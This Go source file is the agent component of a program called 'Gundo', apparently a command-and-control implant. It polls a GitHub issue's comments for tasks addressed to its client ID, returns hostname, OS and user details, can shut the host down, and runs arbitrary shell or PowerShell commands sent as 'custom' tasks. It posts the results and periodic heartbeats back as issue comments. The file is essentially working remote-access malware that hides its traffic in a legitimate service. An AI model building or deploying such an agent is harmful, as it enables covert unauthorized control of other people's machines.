package agent

import (
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"gundo/shared"
)

const clientVersion = shared.Version

// agent memory state for records
type Client struct {
	ID        string
	Version   string
	StartedAt time.Time
	// set of task ID already handled to avoid duplicate execution
	// MB: Gonna keep this out for now given our program has no cases that could lead to dupe IDs. but of course in terms of the merit of engineering edge cases do happen and should be built into handle those
	// Processed map[string]struct{}
}

func NewClient(clientID string) *Client {
	return &Client{
		ID:        clientID,
		Version:   clientVersion,
		StartedAt: time.Now().UTC(),
	}
}

// execute runs shell commands and returns stdout/stderr.
// Uses the platform's native shell so user has freedom. Pipes, redirects, envs, etc. all work.

func execute(cmd string) string {
	trimmed := strings.TrimSpace(cmd)

	// Intercept 'cd' so directory changes persist across commands.
	if strings.EqualFold(trimmed, "cd") || strings.HasPrefix(strings.ToLower(trimmed), "cd ") {
		return handleCd(trimmed)
	}

	var c *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		c = exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmd)
	default:
		c = exec.Command("/bin/sh", "-c", cmd)
	}

	out, err := c.CombinedOutput()
	result := strings.TrimSpace(string(out))

	if err != nil {
		if result != "" {
			return fmt.Sprintf("%s\n[exit error: %s]", result, err)
		}
		return fmt.Sprintf("[exit error: %s]", err)
	}
	if result == "" {
		return "[command produced no output]"
	}
	return result
}

// handleCd changes the process working directory so subsequent commands inherit it.
// Child shells can't change the parent's cwd, so we do it here.
func handleCd(cmd string) string {
	target := strings.TrimSpace(cmd[2:]) // strip 'cd'
	target = strings.Trim(target, `"'`)  // strip quotes

	if target == "" {
		cwd, err := os.Getwd()
		if err != nil {
			return fmt.Sprintf("[error getting cwd: %s]", err)
		}
		return cwd
	}

	if target == "~" || strings.HasPrefix(target, "~/") || strings.HasPrefix(target, `~\`) {
		home, err := os.UserHomeDir()
		if err == nil {
			if target == "~" {
				target = home
			} else {
				target = filepath.Join(home, target[2:])
			}
		}
	}

	if err := os.Chdir(target); err != nil {
		return fmt.Sprintf("cd: %s", err)
	}

	newDir, err := os.Getwd()
	if err != nil {
		return target
	}
	return newDir
}

func (c *Client) handleTask(task shared.GundoMessage) shared.GundoMessage {
	// Every result needs these common fields.
	// take task from param --> drop it in to start building result return struct --> populate struct with output and return it
	result := shared.GundoMessage{
		Type:      "result",
		TaskID:    task.TaskID,
		ClientID:  c.ID,
		Status:    "success",
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}

	// Run only explicitly supported Gundo actions.
	switch task.Action {

	case "ping":
		result.Output = "pong"

	case "get_hostname":
		hostname, err := os.Hostname()
		if err != nil {
			result.Status = "error"
			result.Output = err.Error()
			break
		}
		result.Output = hostname

	case "get_os":
		result.Output = runtime.GOOS

	case "get_user":
		currentUser, err := user.Current()
		if err != nil {
			result.Status = "error"
			result.Output = err.Error()
			break
		}
		result.Output = currentUser.Username

	case "shutdown":
		result.Output = "shutdown scheduled"
		go func() {
			time.Sleep(1 * time.Second) // allow network response to flush
			if runtime.GOOS == "windows" {
				_ = exec.Command("shutdown", "/s", "/t", "0").Run()
			} else {
				_ = exec.Command("shutdown", "-h", "now").Run()
			}
		}()

	case "custom":
		if task.Command == "" {
			result.Status = "error"
			result.Output = "no command provided"
			break
		}
		result.Output = execute(task.Command)
	default:
		result.Status = "error"
		result.Output = "unsupported action"
	}
	return result
}

func (c *Client) createHeartbeat() shared.GundoMessage {
	return shared.GundoMessage{
		Type:      "heartbeat",
		ClientID:  c.ID,
		Status:    "online",
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}
}

func (c *Client) HeartbeatLoop(issueNumber int) {
	// Sent when the client starts
	heartbeat := c.createHeartbeat()

	if err := shared.CreateComment(issueNumber, heartbeat); err != nil {
		fmt.Printf("Heartbeat failed: %v\n", err)
	} else {
		fmt.Println("[+] Heartbeat sent")
	}

	// ticker to determine the heartbeat timing
	ticker := time.NewTicker(2 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		heartbeat := c.createHeartbeat()

		if err := shared.CreateComment(issueNumber, heartbeat); err != nil {
			fmt.Printf("Heartbeat failed, agent may be down: %v\n", err)
			continue
		}
		fmt.Println("[+] Heartbeat sent")
	}
}

func (c *Client) PollTasks(issueNumber int) {
	// Get the comments that already exist when the client starts.
	comments, err := shared.ListComments(issueNumber)
	if err != nil {
		fmt.Printf("Error getting initial comments: %v\n", err)
		return
	}

	// Keep the existing startup behavior: bookmark history without executing it.
	var checkpoint shared.CommentCheckpoint
	if _, err := checkpoint.Accept(comments); err != nil {
		fmt.Printf("Error establishing comment bookmark: %v\n", err)
		return
	}

	fmt.Printf("[+] Agent %s listening for tasks...\n", c.ID)

	for {
		comments, err := checkpoint.Poll(issueNumber, shared.ListCommentsSince)
		if err != nil {
			fmt.Printf("Error polling comments: %v\n", err)
		} else {
			for _, comment := range comments {
				// Convert the GitHub comment body into a Gundo message.
				message, err := shared.ParseGundoMessage(comment.Body)
				if err != nil {
					fmt.Printf("Ignoring non-Gundo comment: %v\n", err)
					continue
				}

				// The client only executes task messages.
				if message.Type != "task" {
					continue
				}

				// Ignore tasks intended for a different client.
				if message.TargetClientID != c.ID {
					continue
				}

				fmt.Printf(
					"[+] Task received: %s (%s)\n",
					message.TaskID,
					message.Action,
				)

				// Execute our supported action.
				result := c.handleTask(message)

				// Send the result back through the same GitHub mailbox.
				err = shared.CreateComment(issueNumber, result)
				if err != nil {
					fmt.Printf(
						"Error posting result for task %s: %v\n",
						message.TaskID,
						err,
					)
					continue
				}

				fmt.Printf(
					"[+] Result sent for task %s: %s\n",
					message.TaskID,
					result.Output,
				)
			}
		}

		time.Sleep(10 * time.Second)
	}
}
